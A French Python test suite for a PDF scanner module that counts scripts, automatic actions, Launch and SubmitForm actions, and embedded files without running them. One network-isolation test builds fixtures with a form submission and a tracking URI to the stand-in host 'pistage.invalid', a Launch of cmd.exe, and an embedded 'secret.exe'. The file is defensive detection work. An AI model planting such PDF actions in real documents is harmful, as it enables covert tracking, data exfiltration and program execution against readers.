"""Éléments actifs d'un PDF : module ``actifspdf``, règles du catalogue (T52, ADR-0219 à
ADR-0222).

Les documents synthétiques sont construits ici ; les échantillons de ``tests/donnees/actifs``
viennent de LibreOffice et de Ghostscript, complétés par pypdf, et ``oracle.json`` consigne ce
qu'en disent ``pdfinfo`` et ``pdfdetach`` de Poppler (``generer_actifs.py``).
"""

import json
import socket
from html import escape
from pathlib import Path
from typing import Any

import pytest
from metadonnees import (
    flux_pdf,
    identifiantes,
    pdf,
    raisons,
    resultats,
    valeurs_de,
)

from voight_kampff._limites import OBJETS_MAX
from voight_kampff._travail import garde
from voight_kampff._travail.contexte import Contexte
from voight_kampff.analyse import Analyse, analyser
from voight_kampff.modules import actifspdf
from voight_kampff.rapport import export
from voight_kampff.rapport._presentation import Presentation, texte
from voight_kampff.rapport.modele import EtatTechnique

pytestmark = pytest.mark.exigence("F-62")

ECHANTILLONS = Path(__file__).parent / "donnees" / "actifs"
PAGES = Path(__file__).parent / "donnees" / "pages"
ORACLE: dict[str, Any] = json.loads((ECHANTILLONS / "oracle.json").read_text(encoding="utf-8"))
PARTIEL = "format_partiel"
JS = b"<</S/JavaScript/JS(app.alert\\(1\\))>>"
RIEN = {
    "actifspdf.pages": 1,
    "actifspdf.pages_lues": 1,
    "actifspdf.actions": 0,
    "actifspdf.scripts": 0,
    "actifspdf.automatiques": 0,
    "actifspdf.ouvertures": 0,
    "actifspdf.envois": 0,
    "actifspdf.fichiers": 0,
}


@pytest.fixture(autouse=True)
def verrouille(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(garde, "_verrouille", True)


def document(
    catalogue: bytes = b"",
    *,
    page: bytes = b"",
    objets: dict[int, bytes] | None = None,
    trailer: str = "/Root 1 0 R",
) -> bytes:
    """Un catalogue (1), l'arbre des pages (2) et une page (3) ; ``objets`` en plus ou à la
    place, le script ``JS`` en 7."""
    tous = {
        1: b"<</Type/Catalog/Pages 2 0 R" + catalogue + b">>",
        2: b"<</Type/Pages/Kids[3 0 R]/Count 1>>",
        3: b"<</Type/Page/Parent 2 0 R" + page + b">>",
        7: JS,
    } | (objets or {})
    return pdf(tous, trailer)


def lignes(contenu: bytes) -> list[dict[str, Any]]:
    return resultats("actifspdf", contenu, "pdf")


def obs(contenu: bytes) -> dict[str, Any]:
    return valeurs_de(lignes(contenu))


def familles(valeurs_: dict[str, Any]) -> dict[str, Any]:
    """Les observations, sans le compte des pages."""
    return {
        n: v for n, v in valeurs_.items() if n not in ("actifspdf.pages", "actifspdf.pages_lues")
    }


# Recherche depuis le catalogue (ADR-0221)


def test_document_sans_element_actif() -> None:
    resultat = lignes(document())
    assert valeurs_de(resultat) == RIEN
    assert raisons(resultat) == []
    assert identifiantes(resultat) == {}


def test_ouverture_par_une_destination_ou_une_action() -> None:
    # Une destination n'est pas une action (§12.3.2) ; aller à une page ne change que
    # l'affichage : action d'ouverture, pas automatique (ADR-0222).
    assert obs(document(b"/OpenAction[3 0 R/Fit]")) == RIEN
    valeurs_ = obs(document(b"/OpenAction<</S/GoTo/D[3 0 R/Fit]>>"))
    assert familles(valeurs_) == {
        "actifspdf.actions": 1,
        "actifspdf.actions.natures": ["GoTo"],
        "actifspdf.actions.declencheurs": ["ouverture"],
        "actifspdf.scripts": 0,
        "actifspdf.automatiques": 0,
        "actifspdf.ouvertures": 0,
        "actifspdf.envois": 0,
        "actifspdf.fichiers": 0,
    }


def test_script_a_l_ouverture() -> None:
    valeurs_ = obs(document(b"/OpenAction 7 0 R"))
    assert familles(valeurs_) == {
        "actifspdf.actions": 1,
        "actifspdf.actions.natures": ["JavaScript"],
        "actifspdf.actions.declencheurs": ["ouverture"],
        "actifspdf.scripts": 1,
        "actifspdf.scripts.natures": ["JavaScript"],
        "actifspdf.scripts.declencheurs": ["ouverture"],
        "actifspdf.automatiques": 1,
        "actifspdf.automatiques.natures": ["JavaScript"],
        "actifspdf.automatiques.declencheurs": ["ouverture"],
        "actifspdf.ouvertures": 0,
        "actifspdf.envois": 0,
        "actifspdf.fichiers": 0,
    }


def test_scripts_de_l_arbre_de_noms() -> None:
    # Nœud intermédiaire, feuilles, nœud vu deux fois, enfant qui n'est pas un dictionnaire,
    # boucle : chaque script une fois (§7.9.6).
    objets = {
        8: b"<</Kids[9 0 R 9 0 R 10 0 R]>>",
        9: b"<</Names[(a) 7 0 R (b) <</S/JavaScript/JS(2)>>]/Kids[8 0 R]>>",
        10: b"5",
    }
    valeurs_ = obs(document(b"/Names<</JavaScript 8 0 R>>", objets=objets))
    assert valeurs_["actifspdf.scripts"] == 2
    assert valeurs_["actifspdf.automatiques.declencheurs"] == ["ouverture"]


def test_actions_du_document() -> None:
    # Imprimer à la fermeture (Named) est automatique ; une clé inconnue n'est pas lue.
    valeurs_ = obs(document(b"/AA<</WC 7 0 R/DP<</S/Named/N/Print>>/Zz<</S/URI>>>>"))
    assert valeurs_["actifspdf.automatiques"] == 2
    assert valeurs_["actifspdf.automatiques.natures"] == ["JavaScript", "Named"]
    assert valeurs_["actifspdf.automatiques.declencheurs"] == ["document"]
    assert valeurs_["actifspdf.envois"] == 0


def test_actions_d_une_page() -> None:
    # Une adresse ouverte à l'affichage de la page (balise de pistage, M-14) ; cacher une
    # annotation ne change que l'affichage.
    valeurs_ = obs(document(page=b"/AA<</O<</S/URI/URI(x)>>/C<</S/Hide>>>>"))
    assert valeurs_["actifspdf.actions.natures"] == ["Hide", "URI"]
    assert valeurs_["actifspdf.automatiques"] == 1
    assert valeurs_["actifspdf.automatiques.natures"] == ["URI"]
    assert valeurs_["actifspdf.automatiques.declencheurs"] == ["page"]
    assert valeurs_["actifspdf.automatiques.pages"] == [1]
    assert valeurs_["actifspdf.envois.pages"] == [1]


def test_actions_des_annotations() -> None:
    annotations = (
        b"/Annots[<</Subtype/Link/A<</S/Launch/F(x)>>>>"
        b" <</Subtype/Widget/AA<</PV 7 0 R/K<</S/JavaScript>>/F<</S/JavaScript>>"
        b"/Zz<</S/URI>>>>>> 5]"
    )
    valeurs_ = obs(document(page=annotations))
    assert valeurs_["actifspdf.actions.declencheurs"] == ["page", "champ", "utilisateur"]
    assert valeurs_["actifspdf.scripts"] == 3
    assert valeurs_["actifspdf.automatiques"] == 2
    assert valeurs_["actifspdf.automatiques.declencheurs"] == ["page", "champ"]
    assert valeurs_["actifspdf.ouvertures"] == 1
    assert valeurs_["actifspdf.ouvertures.declencheurs"] == ["utilisateur"]
    assert valeurs_["actifspdf.ouvertures.pages"] == [1]
    assert valeurs_["actifspdf.envois"] == 0


def test_annotations_mal_formees() -> None:
    assert obs(document(page=b"/Annots 5")) == RIEN
    assert obs(document(page=b"/Annots[<</A 5>> <</AA 5>>]")) == RIEN


def test_chaine_d_actions() -> None:
    # /Next : une action, ou une liste d'actions ; boucle ; élément sans type (§12.6.2).
    ouverture = b"/OpenAction<</S/GoTo/Next[7 0 R <</S/URI/Next 11 0 R>> <</Next 7 0 R>>]>>"
    objets = {11: b"<</S/Launch/Next 11 0 R>>"}
    valeurs_ = obs(document(ouverture, objets=objets))
    assert valeurs_["actifspdf.actions"] == 4
    assert valeurs_["actifspdf.actions.natures"] == ["GoTo", "JavaScript", "Launch", "URI"]
    assert valeurs_["actifspdf.automatiques"] == 3
    assert valeurs_["actifspdf.automatiques.declencheurs"] == ["ouverture"]


def test_action_atteinte_deux_fois() -> None:
    valeurs_ = obs(document(b"/OpenAction 7 0 R", page=b"/Annots[<</A 7 0 R>>]"))
    assert valeurs_["actifspdf.actions"] == 1
    assert valeurs_["actifspdf.scripts.declencheurs"] == ["ouverture", "utilisateur"]
    assert valeurs_["actifspdf.scripts.pages"] == [1]
    # Ses seuls déclencheurs automatiques comptent pour la famille des automatiques.
    assert valeurs_["actifspdf.automatiques.declencheurs"] == ["ouverture"]


def test_rendition_et_nature_inconnue() -> None:
    annotations = (
        b"/Annots[<</A<</S/Rendition/JS(x)>>>> <</A<</S/Rendition>>>> <</A<</S/Inventee>>>>"
        b" <</A<</S 5>>>>]"
    )
    valeurs_ = obs(document(page=annotations))
    assert valeurs_["actifspdf.actions"] == 3
    assert valeurs_["actifspdf.actions.natures"] == ["Rendition", "autre"]
    assert valeurs_["actifspdf.scripts"] == 1
    assert valeurs_["actifspdf.scripts.natures"] == ["Rendition"]


def test_champs_du_formulaire() -> None:
    # Arbre des champs : actions /AA d'un champ, action d'une annotation fille, boucle, champ
    # qui n'est pas un dictionnaire (§12.7.4) ; aucune page.
    objets = {
        12: b"<</T(a)/AA<</C 7 0 R/V<</S/JavaScript>>>>/Kids[13 0 R]>>",
        13: b"<</A<</S/SubmitForm>>/Kids[12 0 R]>>",
    }
    valeurs_ = obs(document(b"/AcroForm<</Fields[12 0 R 12 0 R 5]>>", objets=objets))
    assert valeurs_["actifspdf.scripts"] == 2
    assert valeurs_["actifspdf.scripts.declencheurs"] == ["champ", "utilisateur"]
    assert valeurs_["actifspdf.automatiques.declencheurs"] == ["champ"]
    assert valeurs_["actifspdf.envois"] == 1
    assert "actifspdf.envois.pages" not in valeurs_
    assert obs(document(b"/AcroForm<</Fields 5>>")) == RIEN


def test_signets() -> None:
    objets = {
        14: b"<</A 7 0 R/Next 15 0 R/First 15 0 R>>",
        15: b"<</A<</S/URI>>/Next 14 0 R/First 16 0 R>>",
        16: b"5",
    }
    valeurs_ = obs(document(b"/Outlines<</First 14 0 R>>", objets=objets))
    assert valeurs_["actifspdf.actions.declencheurs"] == ["utilisateur"]
    assert (valeurs_["actifspdf.scripts"], valeurs_["actifspdf.envois"]) == (1, 1)
    assert valeurs_["actifspdf.automatiques"] == 0
    assert obs(document(b"/Outlines 5")) == RIEN


def test_formulaire_xfa() -> None:
    valeurs_ = obs(document(b"/AcroForm<</XFA 17 0 R>>", objets={17: flux_pdf("", b"<xdp/>")}))
    assert valeurs_["actifspdf.scripts"] == 1
    assert valeurs_["actifspdf.scripts.natures"] == ["XFA"]
    assert "actifspdf.scripts.declencheurs" not in valeurs_
    assert valeurs_["actifspdf.actions"] == 0
    assert obs(document(b"/AcroForm<</XFA null>>")) == RIEN


def test_fichiers_incorpores() -> None:
    # Arbre /EmbeddedFiles, fichiers associés du catalogue, d'une page et d'une annotation,
    # fichier joint ; une spécification vue trois fois compte une fois ; sans /EF, ou réduite à
    # un chemin, elle désigne un fichier hors du document (§7.11).
    catalogue = (
        b"/Names<</EmbeddedFiles<</Names[(a) 18 0 R (b) <</F(x)>> (c) (chemin)]>>>>/AF[18 0 R]"
    )
    annotation = b"<</Subtype/FileAttachment/FS 18 0 R/AF[<</EF<</F 19 0 R>>>>]>>"
    page = b"/AF[<</EF<<>>>>]/Annots[" + annotation + b"]"
    objets = {18: b"<</Type/Filespec/EF<</F 19 0 R>>>>", 19: flux_pdf("", b"x")}
    valeurs_ = obs(document(catalogue, page=page, objets=objets))
    assert (valeurs_["actifspdf.fichiers"], valeurs_["actifspdf.fichiers.pages"]) == (3, [1])
    assert valeurs_["actifspdf.actions"] == 0
    assert obs(document(b"/AF 5/Names<</EmbeddedFiles 5>>")) == RIEN
    assert "actifspdf.fichiers.pages" not in obs(document(catalogue, objets=objets))


@pytest.mark.exigence("ES-06", "NF-01")
def test_rien_n_est_lu_ni_suivi(monkeypatch: pytest.MonkeyPatch) -> None:
    # Ni adresse, ni nom de fichier, ni code de script n'est lu (ADR-0220) ; aucune connexion
    # n'est tentée (ES-06, ADR-0033).
    def interdit(*_arguments: object, **_options: object) -> None:
        raise AssertionError("connexion réseau")

    monkeypatch.setattr(socket, "socket", interdit)
    monkeypatch.setattr(socket, "create_connection", interdit)
    catalogue = (
        b"/OpenAction<</S/JavaScript/JS(this.submitForm\\('http://pistage.invalid/js'\\))>>"
        b"/Names<</EmbeddedFiles<</Names[(secret.exe) 18 0 R]>>>>"
    )
    page = (
        b"/AA<</O<</S/URI/URI(http://pistage.invalid/ouvert)>>>>"
        b"/Annots[<</A<</S/Launch/F(calc.exe)/Win<</F(cmd.exe)>>>>>>"
        b" <</A<</S/SubmitForm/F(http://pistage.invalid/envoi)>>>>]"
    )
    objets = {18: b"<</Type/Filespec/F(secret.exe)/EF<</F 19 0 R>>>>", 19: flux_pdf("", b"MZ")}
    resultat = lignes(document(catalogue, page=page, objets=objets))
    valeurs_ = valeurs_de(resultat)
    assert valeurs_["actifspdf.automatiques"] == 2
    assert (valeurs_["actifspdf.ouvertures"], valeurs_["actifspdf.envois"]) == (1, 2)
    assert valeurs_["actifspdf.fichiers"] == 1
    for chaine in ("pistage", "calc", "cmd", "secret", "submitForm"):
        assert chaine not in str(resultat), chaine
    assert identifiantes(resultat) == {}


# Lecture partielle


def test_document_chiffre() -> None:
    # La structure d'un document chiffré n'est pas chiffrée : elle se lit (ADR-0221).
    resultat = lignes(document(b"/OpenAction 7 0 R", trailer="/Root 1 0 R/Encrypt<<>>"))
    valeurs_ = valeurs_de(resultat)
    assert valeurs_["actifspdf.chiffre"] is True
    assert valeurs_["actifspdf.scripts"] == 1
    assert raisons(resultat) == []


def test_document_illisible() -> None:
    resultat = lignes(b"%PDF-1.7\n")
    assert valeurs_de(resultat) == {}
    assert raisons(resultat) == [PARTIEL]


@pytest.mark.parametrize("numero", [1, 2])
def test_catalogue_ou_arbre_des_pages_illisible(numero: int) -> None:
    abime = document().replace(f"\n{numero} 0 obj".encode(), b"\nx 0 obj", 1)
    resultat = lignes(abime)
    assert valeurs_de(resultat) == {}
    assert raisons(resultat) == [PARTIEL]


def test_partie_illisible() -> None:
    # Une action illisible n'arrête pas la lecture des autres parties.
    contenu = document(b"/OpenAction 7 0 R", page=b"/Annots[<</A<</S/URI>>>>]")
    resultat = lignes(contenu.replace(b"\n7 0 obj", b"\nx 0 obj", 1))
    valeurs_ = valeurs_de(resultat)
    assert raisons(resultat) == [PARTIEL]
    assert (valeurs_["actifspdf.scripts"], valeurs_["actifspdf.envois"]) == (0, 1)
    assert valeurs_["actifspdf.pages_lues"] == 1


def test_page_illisible() -> None:
    contenu = document(page=b"/Annots 8 0 R", objets={8: b"[]"})
    resultat = lignes(contenu.replace(b"\n8 0 obj", b"\nx 0 obj", 1))
    assert valeurs_de(resultat)["actifspdf.pages_lues"] == 0
    assert raisons(resultat) == [PARTIEL]


def test_trop_d_actions(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(actifspdf, "ACTIONS_MAX", 1)
    valeurs_ = obs(document(b"/OpenAction 7 0 R", page=b"/Annots[<</A<</S/URI>>>>]"))
    assert valeurs_["actifspdf.actions"] == 1
    assert valeurs_["actifspdf.recherche_coupee"] is True


@pytest.mark.parametrize(
    "catalogue",
    [
        b"/Names<</JavaScript<</Names[(a) 7 0 R]>>>>",
        b"/AcroForm<</Fields[<</A 7 0 R>> <</A 7 0 R>>]>>",
        b"/Outlines<</First<</A 7 0 R/Next<</A 7 0 R>>>>>>",
    ],
    ids=["noms", "champs", "signets"],
)
def test_arbre_trop_grand(monkeypatch: pytest.MonkeyPatch, catalogue: bytes) -> None:
    monkeypatch.setattr(actifspdf, "NOEUDS_MAX", 1)
    valeurs_ = obs(document(catalogue))
    assert valeurs_["actifspdf.recherche_coupee"] is True
    assert valeurs_["actifspdf.actions"] <= 1


def test_pages_au_dela_de_la_limite(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(actifspdf, "PAGES_MAX", 1)
    objets = {
        2: b"<</Type/Pages/Kids[3 0 R 8 0 R]/Count 2>>",
        8: b"<</Type/Page/Annots[<</A 7 0 R>>]>>",
    }
    valeurs_ = obs(document(page=b"/Annots[<</A<</S/URI>>>>]", objets=objets))
    assert (valeurs_["actifspdf.pages"], valeurs_["actifspdf.pages_lues"]) == (2, 1)
    assert (valeurs_["actifspdf.envois"], valeurs_["actifspdf.scripts"]) == (1, 0)


def test_arret_avant_le_budget(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(actifspdf, "OBJETS_RESERVES", OBJETS_MAX)
    valeurs_ = obs(document(b"/OpenAction 7 0 R", page=b"/Annots[<</A 7 0 R>>]"))
    assert valeurs_["actifspdf.arret_avant_budget"] is True
    assert (valeurs_["actifspdf.pages_lues"], valeurs_["actifspdf.actions"]) == (0, 0)


@pytest.mark.parametrize("apres", range(1, 22))
def test_arret_en_cours_de_recherche(monkeypatch: pytest.MonkeyPatch, apres: int) -> None:
    # Le budget s'épuise après « apres » vérifications, sur 22 : arbres, annotations ou pages
    # restent en partie lus, et ce qui a été trouvé est observé.
    appels = {"n": 0}

    def objets_(_contexte: Any) -> int:
        appels["n"] += 1
        return OBJETS_MAX if appels["n"] > apres else 0

    monkeypatch.setattr(Contexte, "objets", property(objets_))
    catalogue = (
        b"/Names<</JavaScript<</Kids[<</Names[(a) 7 0 R]>> <</Names[(b) 7 0 R]>>]>>>>"
        b"/AcroForm<</Fields[<</A 7 0 R>> <</A 7 0 R>>]>>"
        b"/Outlines<</First<</A 7 0 R/Next<</A 7 0 R>>>>>>"
    )
    page = b"/Annots[<</A 7 0 R>> <</A 7 0 R>>]"
    objets = {
        2: b"<</Type/Pages/Kids[3 0 R 8 0 R]/Count 2>>",
        8: b"<</Type/Page/Annots[<</A 7 0 R>>]>>",
    }
    valeurs_ = obs(document(catalogue, page=page, objets=objets))
    assert valeurs_["actifspdf.arret_avant_budget"] is True
    assert valeurs_["actifspdf.pages_lues"] < 2
    assert valeurs_["actifspdf.actions"] <= 1


def test_catalogue_en_flux() -> None:
    # Un catalogue ou une page que le lecteur rend en flux est lu par son dictionnaire.
    objets = {1: flux_pdf("/Type/Catalog/Pages 2 0 R/OpenAction 7 0 R", b"")}
    assert obs(document(objets=objets))["actifspdf.scripts"] == 1
    objets = {3: flux_pdf("/Type/Page/Parent 2 0 R/Annots[<</A 7 0 R>>]", b"")}
    valeurs_ = obs(document(objets=objets))
    assert (valeurs_["actifspdf.pages_lues"], valeurs_["actifspdf.scripts.pages"]) == (1, [1])


# Échantillons, oracle et règles


ATTENDUS = {
    "liens": {"R-ACTIFSPDF-004"},
    "formulaire": {"R-ACTIFSPDF-004"},
    "ghostscript": {"R-ACTIFSPDF-001", "R-ACTIFSPDF-002", "R-ACTIFSPDF-003", "R-ACTIFSPDF-005"},
    "javascript": {"R-ACTIFSPDF-001", "R-ACTIFSPDF-002", "R-ACTIFSPDF-004"},
    "piece_jointe": {"R-ACTIFSPDF-004", "R-ACTIFSPDF-005"},
    "balise": {"R-ACTIFSPDF-002", "R-ACTIFSPDF-004"},
    "calcul": {"R-ACTIFSPDF-001", "R-ACTIFSPDF-002", "R-ACTIFSPDF-004"},
    "xfa": {"R-ACTIFSPDF-001", "R-ACTIFSPDF-004"},
    "chiffre": {"R-ACTIFSPDF-001", "R-ACTIFSPDF-002", "R-ACTIFSPDF-003", "R-ACTIFSPDF-005"},
}
ORDINAIRES = ("document", "ghostscript")
"""Échantillons de ``tests/donnees/pages`` (LibreOffice, Ghostscript), sans élément actif."""


def test_echantillons_et_oracle_concordent() -> None:
    assert set(ORACLE["echantillons"]) == set(ATTENDUS)


@pytest.mark.parametrize("nom", sorted(ORACLE["echantillons"]))
def test_echantillons_compares_a_poppler(nom: str) -> None:
    # pdfinfo dit s'il y a du JavaScript et un formulaire XFA ; pdfinfo -js liste chaque script,
    # pdfdetach -list chaque fichier incorporé.
    attendu = ORACLE["echantillons"][nom]
    resultat = lignes((ECHANTILLONS / f"{nom}.pdf").read_bytes())
    valeurs_ = valeurs_de(resultat)
    assert raisons(resultat) == []
    natures = valeurs_.get("actifspdf.scripts.natures", [])
    xfa = "XFA" in natures
    assert xfa == (attendu["formulaire"] == "XFA")
    assert ("JavaScript" in natures) == (attendu["javascript"] == "yes")
    assert valeurs_["actifspdf.scripts"] - xfa == len(attendu["scripts"])
    assert valeurs_["actifspdf.fichiers"] == attendu["fichiers"]
    assert valeurs_.get("actifspdf.chiffre", False) == (attendu["chiffre"] == "yes")


@pytest.mark.parametrize("nom", ORDINAIRES)
def test_documents_ordinaires(nom: str) -> None:
    valeurs_ = obs((PAGES / f"{nom}.pdf").read_bytes())
    assert familles(valeurs_) == familles(RIEN)


@pytest.fixture(scope="module")
def analyses(tmp_path_factory: pytest.TempPathFactory) -> dict[str, Analyse]:
    dossier = tmp_path_factory.mktemp("actifs")
    trouvees = {}
    sources = {n: ECHANTILLONS / f"{n}.pdf" for n in ATTENDUS}
    sources |= {f"pages_{n}": PAGES / f"{n}.pdf" for n in ORDINAIRES}
    for nom, source in sources.items():
        chemin = dossier / f"{nom}.pdf"
        chemin.write_bytes(source.read_bytes())
        trouvees[nom] = analyser(chemin)
    return trouvees


def regles(analyse: Analyse) -> set[str]:
    return {c.regle.identifiant for c in analyse.constats if c.module == "actifspdf"}


@pytest.mark.parametrize(
    ("nom", "attendues"),
    [*ATTENDUS.items(), *((f"pages_{n}", set()) for n in ORDINAIRES)],
)
def test_regles_du_catalogue(analyses: dict[str, Analyse], nom: str, attendues: set[str]) -> None:
    analyse = analyses[nom]
    etats = {t.module: t.etat for t in analyse.couverture.techniques}
    assert etats["actifspdf"] is EtatTechnique.APPLIQUEE
    assert regles(analyse) == attendues


def test_phrases_des_constats(analyses: dict[str, Analyse]) -> None:
    attendus = {
        "ghostscript": (
            "Le document porte 1 script(s) qu'un lecteur PDF peut exécuter (JavaScript) : "
            "l'outil ne les a ni lus ni exécutés.",
            "Le document porte 1 action(s) qu'un lecteur PDF déclenche sans geste de "
            "l'utilisateur (déclencheurs : ouverture ; natures : JavaScript) : l'outil n'en a "
            "exécuté aucune.",
            "Le document porte 1 action(s) qui lancent un programme ou ouvrent un autre fichier "
            "(Launch) : l'outil n'en a exécuté aucune ni n'a ouvert de fichier.",
            "Le document incorpore 1 fichier(s) : ils ne sont ni ouverts ni analysés par l'outil.",
        ),
        "balise": (
            "Le document porte 3 action(s) qui envoient le formulaire ou ouvrent une adresse "
            "(URI) : l'outil n'a consulté aucune adresse écrite dans le fichier.",
            "(déclencheurs : page ; natures : URI)",
        ),
        "xfa": ("1 script(s) qu'un lecteur PDF peut exécuter (XFA)",),
    }
    for nom, phrases in attendus.items():
        page = export.exporter_html(analyses[nom])
        for phrase in phrases:
            assert escape(phrase) in page, phrase


def test_controle_avant_publication_complet(analyses: dict[str, Analyse]) -> None:
    # Le module ne lit aucune métadonnée identifiante : une analyse non menée ne rend pas le
    # contrôle avant publication incomplet (ADR-0222).
    analyse = analyses["liens"]
    assert "actifspdf" not in {n.module for n in analyse.non_menees}
    assert texte("resume.publication_incomplete") not in Presentation(analyse, ()).publication()
